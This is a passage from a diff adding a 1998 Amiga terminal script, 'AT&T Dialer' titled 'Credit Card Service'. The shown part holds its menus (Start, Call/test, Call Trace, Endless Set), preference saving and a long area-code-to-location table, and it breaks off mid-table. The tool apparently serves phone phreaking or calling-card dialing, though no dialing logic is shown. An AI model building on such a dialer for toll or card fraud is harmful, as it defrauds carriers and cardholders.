@@ -1,0 +1,8394 @@
+
+
+
+
+
+/* $VER: AT&T Dialer by Highlander (08-JAn-1998) */
+CLEAR
+
+BAUD = 19200
+
+VERSION:
+Version$ = "4.6"
+DATEVER$ = "AT&Tdialer.scp (08-JAn-1998)"
+IF EXISTS("ENV:Dialer00.prefs")
+GoSub LOAD
+ ELSE
+Gosub Write_def
+EndIf
+Gosub AREA_I
+Gosub PHONE_I
+Gosub ModemInit
+
+MAINMENU:
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$"  [0m     [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local " -*- Main Control Menu -*-                 "
+Print Local
+Print Local " [33m- [0m1[33m -[0m AreaCode       [33m- [0m5[33m -[0m AreaInfo        [33m- [0mI[33m -[0m Modem Init"
+Print Local " [33m- [0m2[33m -[0m PhoneNumber    [33m- [0m6[33m -[0m Load Prefs      [33m- [0mL[33m -[0m Logs      "
+Print Local " [33m- [0m3[33m -[0m Start          [33m- [0m7[33m -[0m Preferences     [33m- [0mA[33m -[0m About     " 
+Print Local " [33m- [0m4[33m -[0m Call/test      [33m- [0m8[33m -[0m ManualMenu      [33m- [0mQ[33m -[0m Exit      "
+Print Local
+Print Local " [33m- [0m*[33m -[0m Call Trace     [33m- [0mE[33m -[0m Endless Set     [33m- [0mM[33m -[0m ModemSet  "
+Print Local
+ASK Local "Please Select Function (0-9,A,I,L,Q,*) >: ", G$
+	G$ = LOWER$(G$)
+	If G$==""
+	 goto MainMenu
+	endif
+	If G$=="a"
+	 Goto About
+	Endif
+	If G$=="m"
+	 Goto ModemSet
+	Endif
+	If G$=="q"
+	 Goto CLOSEIT
+	Endif
+	If G$=="8"
+	 ver$=""
+	 Goto ManualMenu
+	Endif
+	If G$=="1"
+	 Goto AreaCode
+	Endif
+	If G$=="2"
+	 Goto Phones
+	Endif
+	If G$=="3"
+	 Goto Start
+	Endif
+	If G$=="5"
+	 Goto AreaCheck
+	Endif
+	If G$=="l"
+	 Goto LOGS
+	Endif
+	If G$=="7"
+	 Goto Config
+	Endif
+	If G$=="4"
+	 Goto ManualCall
+	Endif
+	If G$=="6"
+	 Goto VERSION
+	Endif
+	If G$=="i"
+	 Gosub ModemInit
+	Endif
+	If G$=="*"
+	 GoTo Label_1
+	Endif
+	If G$=="e"
+	 Gosub Endless
+	Endif
+
+
+Goto MainMenu
+END
+
+ABOUT:
+	CLS
+	Loop = 0
+	Print Local "                                                    ###"
+        Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+	Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+	Print Local
+	Print Local " Programming Highlander / Ideas-BetaTesting Fashion Light :)"
+	Print Local " Current Version " DATEVER$
+	Print Local " About Window 15 Second Display ...";
+ABOUTLOOP:
+	Loop = Loop + 1
+	If Loop > 15
+         Loop = 0
+	 Goto MainMenu
+	else
+	Print Local ".";
+	Pause 1
+	Goto ABOUTLOOP
+	endif
+END
+
+MODEMSET:
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$"  [0m     [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local " -*- Modem Settings Menu -*-                 "
+Print Local
+Print Local " [33m- [0m1[33m -[0m Ear Output  "
+Print Local " [33m- [0m2[33m -[0m Speaker Out "
+Print Local " [33m- [0m3[33m -[0m Monitor Out "
+Print Local " [33m- [0m4[33m -[0m Save Prefs !"
+Print Local
+Print Local " [33m- [0mI[33m -[0m Modem Init  "
+Print Local
+ASK Local "Please Select Function (0-4) >: ", F$
+	F$ = LOWER$(F$)
+
+	If F$==""
+	 Gosub MainMenu
+	Endif
+
+	If F$=="i"
+	 Gosub ModemInit
+	Endif
+	If F$=="2"
+	 print local
+	 Input Local "[33mSpeaker Output[0m (0-3).....>: ",SL$
+	  If SL$==""
+	    SL$="2"
+	  Endif
+	 MLR$=ALR$+SL$+RVG$
+	Endif
+
+	If F$=="1"
+	 print local
+	 Input Local "[33mEar Output[0m (0-255).....>: ",DV$
+	  If DV$==""
+	    DV$="100"
+	  Endif
+	 VGR$=SVG$+DV$+RVG$
+	Endif
+
+	If F$=="3"
+	 print local
+	 Input Local "[33mMonitor Output[0m (0-2).....>: ",GS$
+	  If GS$==""
+	    GS$="2"
+	  Endif
+	 GMLR$=GALR$+GS$+RVG$
+	Endif
+
+	If F$=="4"
+	 print local
+	 Ask Local "[33mSave Modem Prefs ?[0m (Y/N).....>: ",HS$
+	  If HS$=="y"
+	  open output 1, "ENV:Dialer02.prefs"
+		  Write #1, DV$
+		  Write #1, SL$
+		  Write #1, GS$
+		  Close #1
+	  open output 1, "ENVARC:Dialer02.prefs"
+		  Write #1, DV$
+		  Write #1, SL$
+		  Write #1, GS$
+	  Close #1
+		  Print Local ;"es Saving ..."
+		  Pause 1
+	    Goto ModemSet
+	  else
+		  Print Local ;" Not Saving ..."
+		  Pause 1
+	    Goto ModemSet
+	  Endif
+	Endif
+
+Goto Modemset
+END
+
+
+LABEl_0:
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local " -*- AreaCode/Phones Control Menu -*-"
+Print Local
+Print Local "[33m Areacode.....[0m>: "A$
+Print Local "[33m Area Time....[0m>: "timeh$+":"+timem$+":00"
+Print Local "[33m State........[0m>: "ASD1$
+Print Local "[33m Number.......[0m>: "B$
+Print Local "[33m Default File.[0m>: "Dirlog$
+Print Local
+Print Local "                            123"
+INPUT LOCAL "[33mAreaCode[0m (3 Digits)..... >: ",A$
+If A$==""
+ Goto MainMenu
+Endif
+ASD1$ == "None"
+Gosub Check
+IF ASD1$ == "None"
+ A$=""
+ Print Local ;"INVALID AREACODE !"
+ BEEP
+ PAUSE 1
+ Goto Label_0
+Endif
+Print Local
+Print Local "                              1234567"
+Input Local "[33mPhoneNumber[0m (7 Digits).....>: ",B$
+If B$==""
+ Goto Label_0
+Endif
+
+IF Dirlog$ != ""
+ OPEN	OUTPUT 1,Dirlog$+A$
+  write	#1 B$
+ CLOSE	#1
+ Goto label_0
+else
+ BEEP
+ Print Local ;"DirLog Config Missing !"
+ PAUSE 1
+ Goto label_0
+Endif
+
+
+LABEl_1:
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local " -*- AreaCode/Phones Control Menu -*-"
+Print Local
+Print Local "[33m Areacode.....[0m>: "A$
+Print Local "[33m State........[0m>: "ASD1$
+Print Local "[33m Number.......[0m>: "B$
+Print Local "[33m Default File.[0m>: "AL1$
+Print Local "[33m Default File.[0m>: "AL2$
+Print Local
+print Local "[33m 0 [0mGenerate New AreaList Filename"
+print Local
+print Local "[33m 1 [0mClear AreaList [33m 3 [0mModify LDL"
+Print Local
+print Local "[33m 2 [0mAdd to List    [33m 4 [0mView AreaLog"
+Print Local
+ASK LOCAL "[33mSelect Input[0m ..... >: ",K$
+	K$ = LOWER$(K$)
+If K$==""
+ Goto MainMenu
+Endif
+
+If K$=="3"
+  Goto Label_0
+Endif
+
+If K$=="4"
+ Goto Area_f
+Endif
+
+
+If K$=="0"
+Print Local
+Print local
+ Print Local "(Return=ENV:AreaCode.Prefs)"
+ INPUT LOCAL "[33mDefault File[0m .... FULL PATH+Filename:",AL1$
+ If AL1$==""
+ AL1$="ENV:AreaCode.Prefs"
+ endif
+ Print local
+ Print Local "(Return=ENVARC:AreaCode.Prefs)"
+ INPUT LOCAL "[33mDefault File[0m .... FULL PATH+Filename:",AL2$
+ If AL2$==""
+ AL2$="ENVARC:AreaCode.Prefs"
+ endif
+ Goto Label_1
+Endif
+
+If K$=="1"
+  OPEN	OUTPUT 1, AL1$
+  CLOSE	#1
+  OPEN	OUTPUT 2, AL2$
+  CLOSE	#2
+A$=""
+ASD1$=""
+B$=""
+goto LABEl_1
+Endif
+
+If K$=="2"
+Print local
+Print Local "                            123"
+INPUT LOCAL "[33mAreaCode[0m (3 Digits)..... >: ",A$
+If A$==""
+ Goto MainMenu
+Endif
+ASD1$ == "None"
+Gosub Aint
+IF ASD1$ == "None"
+ A$=""
+ Print Local ;"INVALID AREACODE !"
+ BEEP
+ PAUSE 1
+ Goto Label_1
+Endif
+Endif
+
+IF AL1$ != ""
+ If Exists (AL1$)
+ OPEN	Append 1,AL1$
+  write	#1 A$
+ CLOSE	#1
+ Goto Label_1
+ else
+ OPEN	Output 1,AL1$
+  write	#1 A$
+ CLOSE	#1
+ Goto Label_1
+ endif
+ If Exists AL2$
+ OPEN	Append 1,AL2$
+  write	#1 A$
+ CLOSE	#1
+ Goto Label_1
+ else
+ OPEN	Output 1,AL2$
+  write	#1 A$
+ CLOSE	#1
+ Goto Label_1
+ endif
+else
+ BEEP
+ Print Local ;"DirLog Config Missing !"
+ PAUSE 1
+ Goto Label_0
+Endif
+
+Goto Label_1
+END
+
+
+AREA_F:
+IF EXISTS (AL1$)
+	Open Input 1, AL1$
+	Print Local " Loading File ..."
+	Else
+	Print Local " Missing File ..."
+	pause 2
+	goto Label_1
+	endif
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "   [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+
+AREA_11:
+D=D+1
+READ #1, A$
+IF A$ == "END_OF_FILE"
+ GOTO AREA_91
+ENDIF
+gosub Check
+Print Local "[33m "A$"[0m-"ASD1$;
+GOTO AREA_21
+
+AREA_21:
+READ #1, A$
+IF A$ == "END_OF_FILE"
+ GOTO AREA_91
+ENDIF
+gosub Check
+Print Local "[33m "A$"[0m-"ASD1$;
+GOTO AREA_31
+
+AREA_31:
+READ #1, A$
+IF A$ == "END_OF_FILE"
+ GOTO AREA_91
+ENDIF
+gosub Check
+Print Local
+Print Local "[33m "A$"[0m-"ASD1$;
+If D==6
+ Print local
+ Print local
+ ASK LOCAL " Press Return (Q=Abort)...",P$
+	P$ = LOWER$(P$)
+	If P$=="q"
+	 Close #1
+	 goto Label_1
+	endif
+ CLS
+ Print Local "                                                    ###"
+ Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "   [0m   [0m@ @[0m    [0mDate:"date$
+ Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+ Print Local
+ D=0
+Endif
+GOTO AREA_11
+
+AREA_91:
+CLOSE #1
+Print Local
+Print Local
+ASK LOCAL "Press Return ...",P$
+Print Local
+ASD1$=""
+ASD2$=""
+A$=""
+Goto Label_1
+
+
+AINT:
+IF A$ == "011" 
+ ASD1$ = "International Call"
+ ASD2$ = " "
+ GoSub tarea_w
+ RETURN
+ Else ASD1$ = "None"  
+Endif
+IF A$ == "201" 
+ ASD1$ = "New Jersey (NJ)   "
+ ASD2$ = "Hackensack, Newark, New Brunswick, Paterson"
+ GoSub tarea_w
+ RETURN
+ Else ASD1$ = "None" 
+Endif
+IF A$ == "202" 
+ ASD1$ = "Washington DC (DC)"
+ ASD2$ = ""
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "203" 
+ ASD1$ = "Connecticut (CT)  "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "204"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = ""
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "205"
+ ASD1$ = "Alabama (AL)      "
+ ASD2$ = ""
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "206"
+ ASD1$ = "Washington (WA)   "
+ ASD2$ = ""
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "207"
+ ASD1$ = "Maine (ME)        "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "208"
+ ASD1$ = "Idaho (ID)        "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "209"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Fresno"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "210"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "San Antonio,Brownsville,McAllen,Bandera, Fredericksburg,Edinburg,Alamo"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "212"
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "New York City"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "213"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Central Los Angeles, Hollywood"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "214"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Dallas, Denison, Paris, Sherman, Ennis, Greenville"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "215"
+ ASD1$ = "Pennsylvania (PA) "
+ ASD2$ = "Allentown(Lehigh Co.),Philadelphia,Lansdale,Levittown,Newtown,Quakertown"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "216"
+ ASD1$ = "Ohio (OH)         "
+ ASD2$ = "Akron, Cleveland, Youngstown"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "217"
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = "Springfield"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "218"
+ ASD1$ = "Minnesota (MN)    "
+ ASD2$ = "Duluth"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "219"
+ ASD1$ = "Indiana (IN)      "
+ ASD2$ = "Gary, South Bend, Warsaw"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "240"
+ ASD1$ = "Maryland          "
+ ASD2$ = "Cumberland, Frederick, Hagerstown"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "242"
+ ASD1$ = "Bahamas           "
+ ASD2$ = "(ALL)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "248"
+ ASD1$ = "Michigan          "
+ ASD2$ = "Novi, Waterford, Troy"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "250"
+ ASD1$ = "British Columbia  "
+ ASD2$ = "Interior, Vancouver Island) and Alaska (major city: Hyder)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "253"
+ ASD1$ = "Washington        "
+ ASD2$ = "Auburn, Kent, Tacoma"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "254"
+ ASD1$ = "Texas             "
+ ASD2$ = "Waco"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "264"
+ ASD1$ = "Anguilla          "
+ ASD2$ = "(ALL)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "268"
+ ASD1$ = "Antigua & Barbuda "
+ ASD2$ = "(ALL)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "281"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Deer Park"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "301"
+ ASD1$ = "Maryland (MD)*OLD*"
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "302"
+ ASD1$ = "Delaware (DE)     "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "303"
+ ASD1$ = "Colorado (CO)     "
+ ASD2$ = "Denver, Grand Junction, Sterling"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "304"
+ ASD1$ = "West Virginia (WV)"
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "305"
+ ASD1$ = "Florida (FL)      "
+ ASD2$ = "Ft. Lauderdale, Key West, Miami"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "306"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Saskatchewan (SK)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "307"
+ ASD1$ = "Wyoming (WY)      "
+ ASD2$ = " (All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "308"
+ ASD1$ = "Nebraska (NE)     "
+ ASD2$ = "North Platte"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "309"
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = "Peoria"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "310"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Long Beach, Redondo Beach, San Pedro, Santa Monica, Century City, Malibu"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "312"
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = "Aurora, Chicago, Waukegan"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "313"
+ ASD1$ = "Michigan (MI)     "
+ ASD2$ = "Ann Arbor,Detroit,Monroe,Chelsea,Dearborn,Plymouth,Livonia,Lincoln Park,Romulus,Taylor,Westland"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "314"
+ ASD1$ = "Missouri (MO)     "
+ ASD2$ = "Poplar Bluff, Rolla, St. Louis"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "315"
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "Syracuse"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "316"
+ ASD1$ = "Kansas (KS)       "
+ ASD2$ = "Dodge City, Wichita"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "317"
+ ASD1$ = "Indiana (IN)      "
+ ASD2$ = "Indianapolis, Kokomo"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "318"
+ ASD1$ = "Louisiana (LA)    "
+ ASD2$ = "Lake Charles, Shreveport"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "319"
+ ASD1$ = "Iowa (IA)         "
+ ASD2$ = "Dubuque"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "320"
+ ASD1$ = "Minnesota         "
+ ASD2$ = "Alexandria, St Cloud"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "330"
+ ASD1$ = "Ohio              "
+ ASD2$ = "Akron, Canton, Warren, Youngstown"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "334"
+ ASD1$ = "Alabama (AL)      "
+ ASD2$ = "Montgomery, Mobile"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "340"
+ ASD1$ = "US Virgin Islands "
+ ASD2$ = "(ALL)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "345"
+ ASD1$ = "Cayman Islands    "
+ ASD2$ = "(ALL)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "352"
+ ASD1$ = "Florida           "
+ ASD2$ = "Gainesville"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "360"
+ ASD1$ = "Washington (WA)   "
+ ASD2$ = "Bellingham, Longview, Marysville, Olympia, Port Orchard, Vancouver, Yelm"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "401"
+ ASD1$ = "Rhode Island (RI) "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "402"
+ ASD1$ = "-Nebraska (NE)    "
+ ASD2$ = "Lincoln, Omaha"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "403"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Alberta (AB), Calgary"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "404"
+ ASD1$ = "Georgia (GA)      "
+ ASD2$ = "Atlanta, Rome, Marietta, Kennesaw, Norcross, Woodstock, Gainesville"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "405"
+ ASD1$ = "Oklahoma (OK)     "
+ ASD2$ = "Norman, Oklahoma City, Stillwater"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "406"
+ ASD1$ = "Montana (MT)      "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "407"
+ ASD1$ = "Florida (FL)      "
+ ASD2$ = "Deltona,Kissimmee,Longwood,Melbourne,Orlando,Palm Beach,Titusville,Winter Park"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "408"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "San Jose"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "409"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Bryan, College Station, Galveston, Beaumont, Vidor, Richwood"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "410"
+ ASD1$ = "Maryland (MD)     "
+ ASD2$ = "Annapolis, Baltimore, Cambridge, Cockeysville"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "412"
+ ASD1$ = "Pennsylvania (PA) "
+ ASD2$ = "Pittsburgh"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "413"
+ ASD1$ = "Massachusetts (MA)"
+ ASD2$ = "Springfield"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "414"
+ ASD1$ = "Wisconsin (WI)    "
+ ASD2$ = "Green Bay, Milwaukee, Racine"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "415"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "San Francisco, San Rafael, San Bruno, Los Altos"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "416"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Ontario (ON), Toronto, Hamilton"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "417"
+ ASD1$ = "Missouri (MO)     "
+ ASD2$ = "Joplin, Springfield"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "418"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Quebec (PQ)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "419"
+ ASD1$ = "Ohio (OH)         "
+ ASD2$ = "Bowling Green, Findlay, Lima, Toledo"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "423"
+ ASD1$ = "Kentucky          "
+ ASD2$ = "Jellico, Kensee, Lot, Oneida, Saxton"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "425"
+ ASD1$ = "Washington        "
+ ASD2$ = "Bellevue, Edmonds, Everett"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "440"
+ ASD1$ = "Ohio              "
+ ASD2$ = "Cleveland, Mentor, Oberlin, Westlake"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "441"
+ ASD1$ = "Bermuda           "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "443"
+ ASD1$ = "Maryland          "
+ ASD2$ = "Annapolis, Baltimore, Rockville, Salisbury"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "473"
+ ASD1$ = "Grenada           "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "501"
+ ASD1$ = "Arkansas (AR)     "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "502"
+ ASD1$ = "Kentucky (KY)     "
+ ASD2$ = "Frankfort, Louisville, Paducah, Shelbyville"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "503"
+ ASD1$ = "Oregon (OR)       "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "504"
+ ASD1$ = "Louisiana (LA)    "
+ ASD2$ = "Baton Rouge, New Orleans"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "505"
+ ASD1$ = "New Mexico (NM)   "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "506"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "New Brunswick (NB)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "507"
+ ASD1$ = "Minnesota (MN)    "
+ ASD2$ = "Rochester"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "508"
+ ASD1$ = "Massachusetts (MA)"
+ ASD2$ = "Northborough"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "509"
+ ASD1$ = "Washington (WA)   "
+ ASD2$ = "Spokane, Walla Walla"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "510"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Berkeley, Fremont, Oakland, Walnut Creek"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "512"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Alice,Del Rio,Corpus Christi,Austin,Brownsville,Rockport,San Antonio"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "513"
+ ASD1$ = "Ohio (OH)         "
+ ASD2$ = "Cincinnati, Dayton"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "514"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Quebec (PQ), Montreal"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "515"
+ ASD1$ = "Iowa (IA)         "
+ ASD2$ = "Des Moines"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "516"
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "Amityville, Farmingdale, Hempstead, Levittown"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "517"
+ ASD1$ = "Michigan (MI)     "
+ ASD2$ = "Lansing, Saginaw, Alpena, Jackson"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "518"
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "Albany, Schenectady"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "519"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Ontario (ON), London"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "520"
+ ASD1$ = "Arizona (AZ)      "
+ ASD2$ = ""
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "540"
+ ASD1$ = "Virginia (VA)     "
